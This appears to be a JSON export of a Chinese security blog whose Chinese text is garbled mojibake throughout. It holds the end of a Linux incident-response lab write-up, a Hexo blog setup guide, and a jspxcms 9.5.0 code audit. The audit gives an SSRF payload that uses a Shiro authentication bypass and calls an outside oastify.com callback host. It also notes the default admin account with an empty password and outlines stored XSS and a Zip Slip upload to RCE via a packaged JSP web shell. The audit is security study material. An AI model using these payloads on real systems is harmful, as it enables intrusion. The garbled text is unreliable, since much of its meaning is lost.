/etc/redis.conf å‘ç°ç¬¬ä¸‰ä¸ªflagï¼šflag&#123;P@ssW0rd_redis&#125; è‡³æ­¤ï¼Œé¶æœºçš„è¦æ±‚å…¨éƒ¨ç»“æŸï¼Œæäº¤flag æ€»ç»“åº”æ€¥å“åº”çš„æ—¶å€™ç«™åœ¨æ”»å‡»è€…çš„è§’åº¦ï¼Œè¿›è¡Œæ”»å‡»æ¨¡æ‹Ÿå¯èƒ½æ›´åŠ æœ‰æ•ˆç‡ï¼Œå¸¸è§„çš„æ£€æŸ¥æœ‰æ—¶å€™æ£€æŸ¥ä¸å‡ºæ¥çš„ï¼Œç«™åœ¨æ”»å‡»è€…çš„è§’åº¦è¿›è¡Œæµ‹è¯•è¯´ä¸å®šå°±æ‰¾å‡ºé—®é¢˜äº†ã€‚","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"http://example.com/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"åº”æ€¥å“åº”/Linux/å®æˆ˜","slug":"åº”æ€¥å“åº”-Linux-å®æˆ˜","permalink":"http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E5%AE%9E%E6%88%98/"}]},{"title":"Linuxæ­å»ºHexoåšå®¢","slug":"Linuxæ­å»ºHexoåšå®¢","date":"2024-10-27T11:01:34.000Z","updated":"2024-10-28T04:19:37.734Z","comments":true,"path":"2024/10/27/Linuxæ­å»ºHexoåšå®¢/","permalink":"http://example.com/2024/10/27/Linux%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"2024-10-27ğŸŒ±æ¹–å·: ğŸŒ¦ ğŸŒ¡ï¸+16Â°C ğŸŒ¬ï¸â†“12km&#x2F;h æ›´æ–°æºæ·»åŠ æºï¼Œç»ˆç«¯è¾“å…¥ï¼šsudo vim &#x2F;etc&#x2F;apt&#x2F;sources.list ä¸‹åˆ—æºé€‰æ‹©éƒ¨åˆ†æ·»åŠ ï¼š å®˜æ–¹æºdeb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contribä¸­ç§‘å¤§æºdeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib é˜¿é‡Œäº‘æºdeb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib æ¸…åå¤§å­¦æºdeb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freeæµ™å¤§æºdeb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freeä¸œè½¯å¤§å­¦æºdeb http://mirrors.neusoft.edu.cn/kali kali-rolling&#x2F;main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling&#x2F;main non-free contribæ–°åŠ å¡kaliæºdeb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contribdeb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib163 Kaliæºdeb http://mirrors.163.com/debian wheezy main non-free contribdeb-src http://mirrors.163.com/debian wheezy main non-free contrib apt-get updateæ›´æ–° ä¸‹è½½ä¾èµ–gitè‡ªå¸¦ node 1apt install node npm 1apt install npm hexo-cli 1npm install -g hexo-cli` æ–°å»ºåšå®¢ç›®å½•1hexo init ä¸‹è½½æ’ä»¶ ä¸Šä¼ GitHubæ’ä»¶ npm install hexo-deployer-git- æ’å…¥å›¾ç‰‡æ’ä»¶ npm install https://github.com/CodeFalling/hexo-asset-image- å›¾ç‰‡æ’ä»¶ä¸‹è½½å¥½åéœ€è¦å°†æ ¹ç›®å½•ä¸­çš„configæ–‡ä»¶çš„post_asset_folderæ”¹æˆtrue æ³¨æ„ï¼šè¿™äº›ä¸€å®šè¦å®‰è£…å¥½ï¼Œä¸è¦åªæ˜¯é…ä¸€ä¸‹ç¯å¢ƒå˜é‡ï¼Œä»å¤´å®‰è£…ä¿é™©ä¸€ç‚¹ hexoä¸»é¢˜hexo-theme-yilia-plusä¸‹è½½cd .&#x2F;themes&#x2F;git clone â€“depth&#x3D;1 https://github.com/JoeyBling/hexo-theme-yilia-plus.git æ˜¾ç¤ºæ–‡ç« çš„éƒ¨åˆ†å†…å®¹æ˜¾ç¤ºæ–‡ç« çš„éƒ¨åˆ†å†…å®¹ 1&lt;!-- more --&gt; æ›´æ–°12cd themes/yilia-plus git pull ä½¿ç”¨æƒ³è¦çš„ä¸»é¢˜éœ€è¦åœ¨configæ–‡ä»¶é…ç½®themeçš„åç§° hexo-theme-reimuhttps://github.com/D-Sketon/hexo-theme-reimu?tab=readme-ov-file hexo-theme-anzhiyuGit å®‰è£åœ¨åšå®¢æ ¹ç›®å½•é‡Œå®‰è£…æœ€æ–°ç‰ˆã€æ¨èã€‘ 1git clone -b main https://github.com/anzhiyu-c/hexo-theme-anzhiyu.git themes/anzhiyu åº”ç”¨ä¸»é¢˜ä¿®æ”¹ hexo é…ç½®æ–‡ä»¶_config.ymlï¼ŒæŠŠä¸»é¢˜æ”¹ä¸ºanzhiyu 1theme: anzhiyu å¦‚æœä½ æ²¡æœ‰ pug ä»¥åŠ stylus çš„æ¸²æŸ“å™¨ï¼Œè¯·ä¸‹è½½å®‰è£…ï¼š npm install hexo-renderer-pug hexo-renderer-stylus --save è¦†ç›–é…ç½®è¦†ç›–é…ç½®å¯ä»¥ä½¿ä¸»é¢˜é…ç½®æ”¾ç½®åœ¨ anzhiyu ç›®å½•ä¹‹å¤–ï¼Œé¿å…åœ¨æ›´æ–°ä¸»é¢˜æ—¶ä¸¢å¤±è‡ªå®šä¹‰çš„é…ç½®ã€‚ é€šè¿‡ Npm å®‰è£…ä¸»é¢˜çš„ç”¨æˆ·å¯å¿½ç•¥ï¼Œå…¶ä»–ç”¨æˆ·å»ºè®®å­¦ä¹ ä½¿ç”¨ã€‚ macos&#x2F;linux åœ¨åšå®¢æ ¹ç›®å½•è¿è¡Œ 1cp -rf ./themes/anzhiyu/_config.yml ./_config.anzhiyu.yml windows å¤åˆ¶/themes/anzhiyu/_config.ymlæ­¤æ–‡ä»¶åˆ° hexo æ ¹ç›®å½•ï¼Œå¹¶é‡å‘½åä¸º_config.anzhiyu.yml ä»¥åå¦‚æœä¿®æ”¹ä»»ä½•ä¸»é¢˜é…ç½®ï¼Œéƒ½åªéœ€ä¿®æ”¹ _config.anzhiyu.yml çš„é…ç½®å³å¯ã€‚ æ³¨æ„ï¼š åªè¦å­˜åœ¨äº _config.anzhiyu.yml çš„é…ç½®éƒ½æ˜¯é«˜ä¼˜å…ˆçº§ï¼Œä¿®æ”¹åŸ _config.yml æ˜¯æ— æ•ˆçš„ã€‚ æ¯æ¬¡æ›´æ–°ä¸»é¢˜å¯èƒ½å­˜åœ¨é…ç½®å˜æ›´ï¼Œè¯·æ³¨æ„æ›´æ–°è¯´æ˜ï¼Œå¯èƒ½éœ€è¦æ‰‹åŠ¨å¯¹ _config.anzhiyu.yml åŒæ­¥ä¿®æ”¹ã€‚ æƒ³æŸ¥çœ‹è¦†ç›–é…ç½®æœ‰æ²¡æœ‰ç”Ÿæ•ˆï¼Œå¯ä»¥é€šè¿‡ hexo g --debug æŸ¥çœ‹å‘½ä»¤è¡Œè¾“å‡ºã€‚ å¦‚æœæƒ³å°†æŸäº›é…ç½®è¦†ç›–ä¸ºç©ºï¼Œæ³¨æ„ä¸è¦æŠŠä¸»é”®åˆ æ‰ï¼Œä¸ç„¶æ˜¯æ— æ³•è¦†ç›–çš„ butterflyå®˜æ–¹æ–‡æ¡£https://butterfly.js.org/posts/21cfbf15/ hexoåŸºç¡€æ“ä½œ å¯åŠ¨æœ¬åœ°æœåŠ¡ 1hexo -s æ¸…ç†ç¼“å­˜ 1hexo clean ç”Ÿæˆé™æ€æ–‡ä»¶ 1hexo g æ¨é€åˆ°github 1hexo d æ–°å»ºæ–‡ç«  1hexo n &quot;æ–‡ä»¶å&quot; hexoè¿›é˜¶æ·»åŠ åˆ†ç±»1hexo new page categories ç„¶åå†å»ç”Ÿæˆçš„source\\categoriesä¸­çš„index.mdä¸­æ·»åŠ type: categories ç„¶ååœ¨æ–‡ç« çš„å¤´ä¸­æ·»åŠ åˆ†ç±»å±æ€§å³å¯ï¼Œåªèƒ½æœ‰ä¸€ä¸ªåˆ†ç±» æ”¹å˜æ–°å»ºæ–‡ä»¶çš„æ¨¡æ¿scaffoldsç›®å½•ä¸­å‚¨å­˜çš„æ˜¯æ–°å»ºæ–‡ä»¶çš„æ¨¡æ¿ï¼Œæ·»åŠ categorieså±æ€§ï¼Œè¿™æ ·æ–°å»ºæ–‡ä»¶çš„æ—¶å€™å°±ä¼šæœ‰è¿™ä¸ªå±æ€§äº† éƒ¨ç½²åˆ°github _config.ymlæ–‡ä»¶é…ç½® åœ¨æ–‡ä»¶çš„æœ€åä¸€è¡Œæ·»åŠ è¿™ä¸ªé…ç½® 123456deploy: type: git repo: https://github.com/ç”¨æˆ·å/ç”¨æˆ·å.github.io.git ï¼ˆæˆ–è€…git@github.com:ç”¨æˆ·å/ç”¨æˆ·å.github.io.gitï¼‰ã€æ¨èã€‘ branch: main åœ¨æœ¬åœ°ç”Ÿæˆæ–°çš„sshkeyæ–‡ä»¶ è¾“å…¥å‘½ä»¤ï¼šcd ~/.sshè¿›å…¥.sshæ–‡ä»¶å¤¹è¾“å…¥å‘½ä»¤ï¼šssh-keygen -t rsa -C &#39;æ³¨å†Œæ—¶çš„é‚®ç®±åœ°å€&#39; ç„¶ååˆ°GitHubï¼Œå»è®¾ç½®é‡Œé¢å°†ç”Ÿæˆçš„pubæ–‡ä»¶çš„å†…å®¹ç²˜è´´åˆ°æ–°å»ºçš„sshä¸­ è¾“å…¥å‘½ä»¤ï¼ˆgitï¼‰ï¼šssh -T git@github.com å¹¶ä¸”è¾“å…¥yesä¹‹åï¼Œè¡Œæœ«å°¾ä¼šæ˜¾ç¤ºä½ çš„ç”¨æˆ·å æ¥ç€åœ¨æœ¬åœ°ç»‘å®šä¸Githubçš„ç”¨æˆ·åå’Œé‚®ç®±ï¼ˆgitï¼‰è¾“å…¥å‘½ä»¤ï¼šgit config â€“global user.name â€œæ³¨å†Œæ—¶ç”¨æˆ·åâ€è¾“å…¥å‘½ä»¤ï¼šgit config â€“global user.email â€œæ³¨å†Œæ—¶é‚®ç®±â€ éšæœºå›¾åºŠhttps://t.mwm.moe/moe/https://t.mwm.moe/fjhttp://www.98qy.com/sjbz/api.php","categories":[{"name":"ç½‘ç«™å»ºè®¾","slug":"ç½‘ç«™å»ºè®¾","permalink":"http://example.com/categories/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"}],"tags":[{"name":"ç½‘ç«™å»ºè®¾","slug":"ç½‘ç«™å»ºè®¾","permalink":"http://example.com/tags/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"}]},{"title":"jspxcmsä»£ç å®¡è®¡","slug":"jspxcmsä»£ç å®¡è®¡","date":"2024-10-24T06:12:46.000Z","updated":"2024-10-30T14:07:17.705Z","comments":true,"path":"2024/10/24/jspxcmsä»£ç å®¡è®¡/","permalink":"http://example.com/2024/10/24/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"2024-10-24ğŸŒ±æ¹–å·: â˜€ï¸ ğŸŒ¡ï¸+20Â°C ğŸŒ¬ï¸â†™11km&#x2F;h åºŸè¯ä¸å¤šè¯´,ç›´æ¥å¼€å§‹å®¡è®¡å‚è€ƒï¼š https://www.cnblogs.com/yokan/p/16248509.html https://0xf4n9x.github.io/jspxcms-code-audit-learn.html æºç åœ°å€https://www.ujcms.com/uploads/jspxcms-9.5.0-release-src.zip éƒ¨ç½²java8+mysql5.7.26 è¿™é‡Œç›´æ¥ä½¿ç”¨phpstudyéƒ¨ç½²mysqlç¯å¢ƒï¼Œç„¶åå¯åŠ¨ ç„¶åæ‰§è¡Œsqlå‘½ä»¤123create database jspxcms_testuse jspxcms_testsource mysql.sql æˆ‘è¿™é‡Œä½¿ç”¨DataGripè¿æ¥æ•°æ®åº“ï¼Œç„¶åæ‰§è¡Œdatabaseç›®å½•ä¸‹çš„sqlæ–‡ä»¶ é…ç½®ideaåœ¨application.propertiesä¸­è®¾ç½®æ•°æ®åº“çš„åç§°ã€å¯†ç ç­‰ç­‰ ç„¶åé…ç½®è¿è¡Œæ–‡ä»¶jdk8ï¼Œé¡¹ç›®ç»“æ„ä¸­è¯­è¨€ç­‰çº§é€‰æ‹©8 ç„¶åç›´æ¥è¿è¡Œå³å¯ æŠ€æœ¯æ ˆ SpringMVC æ¡†æ¶ã€Spring Data JPA æ¡†æ¶ï¼ŒHibernate ä½œä¸ºæ•°æ®åº“æŒä¹…åŒ–æ¡†æ¶ï¼ŒShiro ä½œä¸ºå®‰å…¨æ¡†æ¶ï¼Œä»¥åŠ Freemarker æ¨¡ç‰ˆå¼•æ“ã€‚ ä¸€èˆ¬é¡¹ç›®çš„æ¡†æ¶éœ€è¦æœ‰å¦‚ä¸‹ MVCæ¨¡å—æ¡†æ¶ æŒä¹…åŒ–æ¨¡å—ï¼šå„ç§JPAã€Hibernateã€Mybatis å®‰å…¨æ¡†æ¶ï¼šShiroã€Spring Securityã€Keycloakç­‰ å®¡è®¡æ­¥éª¤ jspxcmsæ˜¯åŸºäºmavenç®¡ç†çš„é¡¹ç›®ï¼Œé¦–å…ˆæŸ¥çœ‹pom.xmlæ–‡ä»¶ jspxcmsçš„åå°åœ°å€æ—¶cmscpï¼Œç”¨æˆ·åæ—¶adminï¼Œå¯†ç ä¸ºç©º è‹¥æ˜¯Gradleç®¡ç†çš„é¡¹ç›®ï¼Œåˆ™æŸ¥çœ‹å¯¹åº”çš„Gradleæ–‡ä»¶ é€šè¿‡pom.xmlæ–‡ä»¶å¯ä»¥å‘ç°SpringMVC æ¡†æ¶ã€Spring Data JPA æ¡†æ¶ï¼ŒHibernate ä½œä¸ºæ•°æ®åº“æŒä¹…åŒ–æ¡†æ¶ï¼ŒShiro ä½œä¸ºå®‰å…¨æ¡†æ¶ï¼Œä»¥åŠ Freemarker æ¨¡ç‰ˆå¼•æ“ã€‚ æ ¹æ®åŠŸèƒ½ç‚¹å®¡è®¡ ç™»å½•åŠŸèƒ½ä¿¡æ¯ç®¡ç†åŠŸèƒ½å‘è¡¨è¯„è®ºæŸ¥çœ‹è¯„è®ºç­‰ç­‰â€¦.. sqlæ³¨å…¥æ¼æ´å®¡è®¡ ä½¿ç”¨codeqlæ‰«æ123https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-089/SqlTainted.qlhttps://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-089/SqlUnescaped.ql å› ä¸ºæŒä¹…åŒ–æ¡†æ¶ä½¿ç”¨çš„æ˜¯hibernateï¼Œæ‰€ä»¥å¯ä»¥æ ¹æ®hibernatçš„å…³é”®è¯æœç´¢éœ€è¦sqlæŸ¥è¯¢çš„åœ°æ–¹ hibernateæ¡†æ¶ä¸€èˆ¬ä¸å¤ªæœ‰sqlæ³¨å…¥æ¼æ´ 12å…³é”®è¯ @Query ä½¿ç”¨ideaè‡ªå¸¦çš„æœç´¢åŠŸèƒ½æŸ¥æ‰¾ ç»è¿‡åˆ†æï¼Œå…¨éƒ½æœ‰å ä½ç¬¦ï¼Œå‘ç°æ²¡æœ‰sqlæ³¨å…¥æ¼æ´ SSRFæ¼æ´å®¡è®¡åœ¨å®¡è®¡ SSRF æ¼æ´å‰ï¼Œéœ€è¦çŸ¥é“ Java ä¸­çš„ä¸€äº›å¸¸è§çš„å¯¹å¤–å‘é€è¯·æ±‚çš„æ–¹æ³•ã€‚ 12345678910111213Socket() OkHttpClient.newCall(request).execute() ImageIO.read() HttpClient.execute() HttpClient.executeMethod() HttpURLConnection.connect() HttpURLConnection.getInputStream() URL.openConnection() URL.openStream() HttpServletRequest() BasicHttpEntityEnclosingRequest() DefaultBHttpClientConnection() BasicHttpRequest() codeqlæ‰«æ1https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-918/RequestForgery.ql å¦‚ä¸Šå›¾ï¼Œæ‰«æå‡ºå¯èƒ½å­˜åœ¨çš„æ¼æ´æœ‰6ä¸ªï¼Œä½†æ˜¯æ­¥éª¤é‚£ä¹ˆå¤šçš„ä¸€èˆ¬æ˜¯æ²¡æœ‰çš„ï¼Œçœ‹æœ€åä¸¤ä¸ªæ­¥éª¤å°‘çš„å³å¯ ç¬¬ä¸€ä¸ªæ¼æ´sourceï¼šCollectController.javaä¸­è°ƒç”¨çš„fetchHtmlæ–¹æ³•sinkï¼šCollect.javaä¸­çš„fetchHtmlæ–¹æ³•çš„httpclient.execute()æ–¹æ³• å¯ä»¥æ ¹æ®codeqlä¸€æ­¥æ­¥çš„è·Ÿè¸ªå³å¯ ä½¿ç”¨ideaæ¥å¯»æ‰¾è¿™ä¸ªæ¼æ´ è·¯ç”±æ˜¯fetch_url.doï¼Œurlå‚æ•°å¯æ§ï¼Œè°ƒç”¨Collect.fetchHtmlæ–¹æ³•ç‚¹è¿›å»æŸ¥çœ‹Collect.fetchHtmlæ–¹æ³•ï¼Œå‘ç°æœ€åä½¿ç”¨äº†httpclient.executeæ–¹æ³• è€Œä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæœ€åä¹Ÿæ˜¯ç›´æ¥é€šè¿‡writeHtmlæ–¹æ³•è¾“å‡ºäº†htmlå†…å®¹ ç„¶åæŸ¥çœ‹Application.javaæ–‡ä»¶ï¼Œå‘ç°æ³¨å†Œçš„åå°åœ°å€ä¸º æ‰€ä»¥ssrfæ¼æ´åœ°å€æ˜¯ï¼š/cmscp/ext/collect/fetch_url.do?url=http://127.0.0.1:80 éœ€è¦å…ˆç™»å½•æ‰èƒ½å¤Ÿåˆ©ç”¨ï¼Œç”¨æˆ·åæ˜¯adminï¼Œå¯†ç æ˜¯ç©ºå‘ç°è‹¥æ˜¯ä¸å­˜åœ¨çš„ç«¯å£å°±æ˜¯å¦‚ä¸‹å› ä¸ºæ˜¯shiroæ¡†æ¶é‰´æƒï¼Œä»–è¿™é‡Œçš„ç‰ˆæœ¬æ˜¯1.3.2ï¼Œå­˜åœ¨CVE-2019-12422æ¼æ´ï¼Œå¯ä»¥è¿›è¡Œæƒé™ç»•è¿‡ï¼Œ ç›´æ¥ä½¿ç”¨å¦‚ä¸‹çš„payloadå³å¯ç»•è¿‡å®ç°ssrf 1http://10.194.7.167:8080/;/cmscp/ext/collect/fetch_url.do?url=http://69dso2emymdj7jwliwga9vvshjnab0zp.oastify.com ç¬¬äºŒä¸ªæ¼æ´ueditorCatchImageæ–¹æ³•ä¸­å­˜åœ¨openConnection()çš„è°ƒç”¨ ueditorCatchImageæ–¹æ³•æœ‰åœ¨ä¸¤ä¸ªä½ç½®å®ç° ä¸€ä¸ªåœ¨foreï¼Œä¸€ä¸ªåœ¨backï¼Œå‰è€…æ˜¯å‰ç«¯ï¼Œåè€…æ˜¯åç«¯ï¼Œè¿™é‡Œå½“ç„¶é€‰æ‹©å‰ç«¯çš„å®ç°è·¯ç”±æ˜¯&#x2F;ueditorï¼Œè·å–å‚æ•°actionçš„å€¼ï¼Œè‹¥å€¼ä¸ºcatchimageåˆ™è°ƒç”¨ueditorCatchImageæ–¹æ³•ï¼Œç„¶åè°ƒç”¨çˆ¶ç±»çš„ueditorCatchImageæ–¹æ³•æœ€åè°ƒç”¨äº†requestä¸­çš„source[]å‚æ•°çš„å€¼ï¼Œç„¶åæ‰§è¡ŒsrcUrl.openConnection()ä»è€Œè§¦å‘ssrfæ¼æ´ ä½†æ˜¯å¯ä»¥å‘ç°ï¼Œä¸‹é¢çš„ä»£ç ä¸­ä¼šåˆ¤æ–­æ˜¯å¦æ˜¯80ã€443ç«¯å£ï¼Œå¹¶ä¸”ä¼šå°†é”™è¯¯ä¸æ‰“å°å‡ºæ¥ï¼Œä¿®å¤äº†ssrfæ¼æ´ æ‰€ä»¥9.5.0ç‰ˆæœ¬è¿™é‡Œæ²¡æœ‰ssrfæ¼æ´äº† æ‰‹åŠ¨å®¡è®¡æ–¹æ³•è‹¥æ˜¯ä¸ç”¨å·¥å…·æ‰«æï¼Œå…¨å±€æœç´¢ä»¥ä¸‹çš„å…³é”®è¯ï¼Œç„¶åä¸€æ­¥æ­¥çš„æ‰¾å…¥å£ç‚¹ 123HttpClient.execute()URL.openConnection() æˆ–è€…æ ¹æ®åŠŸèƒ½ç‚¹æ¥æŸ¥æ‰¾ï¼Œä¸€èˆ¬æ˜¯åœ¨è¯·æ±‚æ–‡ä»¶çš„æ¥å£æœ‰å¯èƒ½ä¼šå‡ºç°ssrfæ¼æ´ xssæ¼æ´å®¡è®¡ ä½¿ç”¨codeqlæ‰«æ1ql\\java\\ql\\src\\Security\\CWE\\CWE-079\\XSS.ql è¿™ä¸ªæ‰«æå‡ºæ¥ä¸å¤ªé è°± æ‰‹åŠ¨å®¡è®¡ ä¸»è¦å…³æ³¨è¯„è®ºåŒº è¾“å…¥ç‚¹ è¾“å‡ºç‚¹ ä½¿ç”¨burpæŠ“åŒ…ï¼Œæ‰¾åˆ°è¾“å…¥ç‚¹çš„è·¯ç”±ä¸ºcomment_submitï¼Œç„¶åå¯»æ‰¾æºç ä¸­çš„ä½ç½®ç»è¿‡ä¸€ç³»åˆ—çš„åˆ¤æ–­ï¼Œæ˜¯å¦ç™»é™†å•Šå•¥çš„ï¼Œç„¶åå°±æ˜¯æ²¡æœ‰è¿‡æ»¤è¾“å…¥ï¼Œç›´æ¥å‚¨å­˜è¿›æ•°æ®åº“ ä½†æ˜¯æ²¡æœ‰æ‰§è¡Œxss æŸ¥çœ‹æ‰€æœ‰è¯„è®ºé¡µé¢ï¼Œå‘ç°è¾“å‡ºè¢«è½¬ä¹‰äº†ï¼Œè¿™æ—¶å€™å¯ä»¥å®¡è®¡pom.xmlæ–‡ä»¶æŸ¥çœ‹æ¨¡æ¿æ’ä»¶ æŸ¥çœ‹è¾“å‡ºï¼Œæœç´¢fidï¼Œæ‰¾åˆ°comment_listè·¯ç”± å‘ç°å®ƒæŸ¥çœ‹è¯„è®ºæ—¶å°†sys_comment_list.htmlä¼ å…¥getTemplateæ–¹æ³•ä¸­ å…¨å±€æœç´¢sys_comment_list.htmlï¼Œå‘ç°è¿™ä¸ªæ–‡ä»¶ è¿™ä¸ªæ˜¯å¯¹è¯„è®ºè¿›è¡Œäº†è½¬ä¹‰ï¼Œæ‰€ä»¥xssæ‰æ²¡æœ‰è§¦å‘ å®šä½åˆ°sys_comment_list.htmlæ–‡ä»¶çš„ç›®å½•ï¼Œå¯»æ‰¾æ˜¯å¦æ²¡æœ‰è¿›è¡Œè½¬ä¹‰çš„æ¨¡æ¿æ–‡ä»¶ å‘ç°sys_member_space_comment.htmlæ–‡ä»¶æ²¡æœ‰å¯¹commentè¿›è¡Œäº†è½¬ä¹‰ å› ä¸ºæˆ‘çš„æ˜¯9.5.0ç‰ˆæœ¬ï¼Œè¿™ä¸ªxssæ¼æ´å·²ç»è¢«ä¿®å¤äº†ï¼Œæ‰€ä»¥æˆ‘å°†è½¬ç§»è¯­å¥åˆ é™¤æˆåŠŸå¤ç°å…¨å±€æœç´¢sys_member_space.htmlï¼Œå‘ç°åœ¨sys_member_space.htmlä¸­å½“type&#x3D;commentæ—¶åˆå¯¹sys_member_space_comment.htmlè¿›è¡Œäº†åŒ…å«å…¨å±€æœç´¢sys_member_space.htmlï¼Œå‘ç°å…¥å£ç‚¹ æˆåŠŸæ‰§è¡Œxss rceæ¼æ´å®¡è®¡Zip Slip ä»»æ„æ–‡ä»¶è¦†ç›–æ¼æ´æ ¹æ®ç½‘ä¸Šæ‰€è¯´æœ‰ä¸€ä¸ªZip Slip ä»»æ„æ–‡ä»¶è¦†ç›–æ¼æ´ï¼Œä½†æ˜¯éœ€è¦ä½¿ç”¨tomcatéƒ¨ç½²æ‰è¡Œï¼Œè¿™é‡Œå°±ç®€å•çš„åˆ†æä»¥ä¸‹æºç å°±è¡Œäº†ï¼Œæ‡’å¾—æ­å»ºäº† äº§ç”Ÿæ¼æ´çš„åŸå› åœ¨äºè°ƒç”¨äº†AntZipUtils.unzipï¼Œä½†æ˜¯æ²¡æœ‰å¯¹å‹ç¼©åŒ…ä¸­çš„å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ä¸Šä¼ çš„åŒ…å«jspæ–‡ä»¶çš„å‹ç¼©åŒ…è‡ªè§£å‹ æ­£å¸¸æ¥è¯´æœ‰ä¸€ä¸ªè¿‡æ»¤å™¨ä½¿å¾—jspæ–‡ä»¶åœ¨è®¿é—®å‰ä¼šè¢«åŠ ä¸Š/jspï¼Œä½†æ˜¯æˆ‘è¿™ä¸ª9.5.0ç‰ˆæœ¬å±…ç„¶ä¿®å¤äº†è¿™ä¸ªæ¼æ´ï¼Œå®ƒä¸ä»…ä»…æ˜¯åŠ ä¸Š/jspï¼Œå®ƒé»˜è®¤è¿˜ä¸å…è®¸JSPæ–‡ä»¶è¢«è®¿é—®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º æ‰€ä»¥æˆ‘ä¸ºäº†å¤ç°æˆåŠŸï¼Œå°†allowedæ”¹æˆäº†true åœ¨åå°ä¸Šä¼ ä¸€ä¸ªjspæ–‡ä»¶çš„å†…å®¹åè®¿é—®ç»“æœå¦‚å›¾ä¸Šä¼ zipæ–‡ä»¶ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä¼šå°†é‡Œé¢çš„æ–‡ä»¶ç›´æ¥è§£å‹å‡ºæ¥ã€‚ä½†æ˜¯jspæ–‡ä»¶è¿˜æ˜¯æ— æ³•è®¿é—® è‹¥æ˜¯ä½¿ç”¨tomcatéƒ¨ç½²çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å°†jspæ‰“åŒ…æˆwaråŒ… 1jar -cf rce.war ./rce.jsp ç„¶åç›´æ¥ä¸Šä¼ ï¼Œtomcatä¼šå°†waråŒ…å½“æˆä¸€ä¸ªé¡¹ç›®ï¼Œå°±èƒ½å¤ŸæˆåŠŸè®¿é—®äº† ä¾èµ–æ¼æ´å®¡è®¡ ä½¿ç”¨codeqlæ‰«æ123https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-1104/MavenPomDependsOnBintray.qlhttps://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-829/InsecureDependencyResolution.ql æ‰«æç»“æœè¿˜æ²¡æœ‰ideaè‡ªå¸¦çš„åŠŸèƒ½å¼º ç‚¹å‡»ideaå·¦ä¸‹è§’çš„æ„Ÿå¹å·ï¼Œç„¶åé€‰æ‹©Vulnerablr dependiesï¼Œæ‰€æœ‰ä¾èµ–æ¼æ´ç»™å°±ä¼šå‡ºç°åœ¨å·¦ä¾§ è¿™é‡Œä¸»è¦å°±å¯¹å‡ ä¸ªæ¼æ´è¿›è¡Œå®éªŒï¼Œä¸ç„¶ä¹Ÿå¤ªå¤šäº† shiroé¡¹ç›®ä½¿ç”¨çš„shiroç‰ˆæœ¬æ—¶1.3.2 è¿™ä¸ªç‰ˆæœ¬å­˜åœ¨å¾ˆå¤šçš„è®¤è¯ç»•è¿‡æ¼æ´ï¼Œè¿˜æœ‰ä¸€ä¸ªCookieå¡«å……æ¼æ´ CVE-2021-41303 Apache Shiro before 1.8.0, when using Apache Shiro with Spring Boot, a specially crafted HTTP request may cause an authentication bypass. Users should update to Apache Shiro 1.8.0. CVE-2022-40664 Apache Shiro before 1.10.0, Authentication Bypass Vulnerability in Shiro when forwarding or including via RequestDispatcher. CVE-2022-32532 Apache Shiro before 1.9.1, a RegexRequestMatcher can be misconfigured to be bypassed on some servlet containers. Applications using RegExPatternMatcher with . in the regular expression are possibly vulnerable to an authorization bypass CVE-2019-12422 Apache Shiro before 1.4.2, when using the default â€œremember meâ€ configuration, cookies could be susceptible to a padding attack. ä¹Ÿå°±æ˜¯å¸¸ç”¨çš„shiro721æ¼æ´ CVE-2020-17523Apache Shiro before 1.7.1, when using Apache Shiro with Spring, a specially crafted HTTP request may cause an authentication bypass å‘ç°ä¾èµ–å­˜åœ¨æ¼æ´åå°±å¯ä»¥æœç´¢å†å²æ¼æ´ï¼Œç„¶ååˆ©ç”¨å…¬å¼€çš„POCè¿›è¡Œå¤ç° CVE-2019-12422åœ¨shiro&lt;&#x3D;1.2.4ç‰ˆæœ¬ä¸­AESåŠ å¯†çš„keyæ˜¯ç¡¬ç¼–ç åœ¨æºç ä¸­ï¼Œè€Œåœ¨è¿™ä¸ªç‰ˆæœ¬ä½¿ç”¨çš„åŠ å¯†æ–¹å¼æ˜¯AES-CBCï¼Œå…¶ä¸­çš„aseåŠ å¯†çš„keyåŸºæœ¬ç”±ç³»ç»Ÿéšæœºç”Ÿæˆ é€šè¿‡padding attackå¯ä»¥ç ´è§£å¯†é’¥ï¼Œç„¶åä½¿ç”¨ç ´è§£çš„keyæ¥æ„é€ cookie åˆ©ç”¨æ¡ä»¶ éœ€è¦çŸ¥é“ç™»é™†æˆåŠŸçš„cookieä¸­çš„rememberMeçš„å€¼ æœ‰åˆ©ç”¨é“¾ï¼Œä¾‹å¦‚cbé“¾ï¼Œæˆ–è€…æ˜¯ccé“¾ä¹‹ç±»çš„ å‚è€ƒï¼šhttps://www.cnblogs.com/dhan/p/18423531 